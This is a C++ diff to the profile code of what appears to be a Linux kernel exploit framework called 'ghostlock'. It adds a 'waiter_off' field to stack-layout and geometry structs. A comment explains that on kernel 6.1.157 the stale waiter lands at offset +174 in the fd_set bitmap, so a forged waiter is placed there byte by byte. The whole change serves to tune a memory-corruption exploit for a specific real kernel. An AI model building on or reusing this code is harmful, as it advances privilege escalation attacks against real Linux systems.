@@ -130,6 +130,7 @@ namespace ghostlock::profile {
 
     struct RouteGeometry {
         std::optional<int32_t> pselect_waiter_shift;
+        std::optional<uint32_t> pselect_waiter_off;
         std::optional<int32_t> mcast_waiter_off;
         std::optional<uint32_t> mcast_buffer_size;
         std::optional<uint32_t> mcast_task_offset;
@@ -162,6 +163,10 @@ namespace ghostlock::profile {
     struct SelectStackLayout {
         std::optional<int32_t> waiter_shift;
         std::optional<uint8_t> compact_waiter;
+        /* Byte offset of the stale waiter inside the kernel's fd_set bitmap.
+         * 6.1.157 requeue geometry lands it at +174 (6 bytes into a word), so
+         * the forged waiter is placed with byte-granular word composites. */
+        std::optional<uint32_t> waiter_off;
     };
 
     struct TcpZerocopyLayout {
@@ -300,6 +305,7 @@ namespace ghostlock::profile {
                        ? (SelectStackLayout){
                            .waiter_shift = values_.geometry.pselect_waiter_shift,
                            .compact_waiter = values_.misc.compact_waiter,
+                           .waiter_off = values_.geometry.pselect_waiter_off,
                        }
                        : SelectStackLayout{};
         }
